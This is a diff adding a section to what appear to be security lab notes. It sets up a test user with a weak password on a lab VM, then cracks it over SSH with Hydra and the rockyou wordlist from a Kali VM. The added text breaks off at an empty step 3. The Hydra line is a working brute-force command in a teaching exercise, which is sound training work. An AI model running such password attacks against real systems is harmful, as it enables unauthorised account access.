@@ -260,3 +260,17 @@ sudo kill -s USR1 ProcessID
 ```
 
 ### Using Hydra to Crack Network Password
+**On web-server2 VM**
+1. Create a new user with the simple password `peanut`
+```
+useradd -m student01
+passwd student01
+```
+
+**On Kali VM**
+2. Run Hydra to crack `student01`'s password with a password list (Hydra will try the values contained in the password list ten at a time)
+```
+hydra web-server2-IP ssh -l student01 -P /usr/share/wordlists/rockyou.txt -V -t 10
+```
+
+3. 
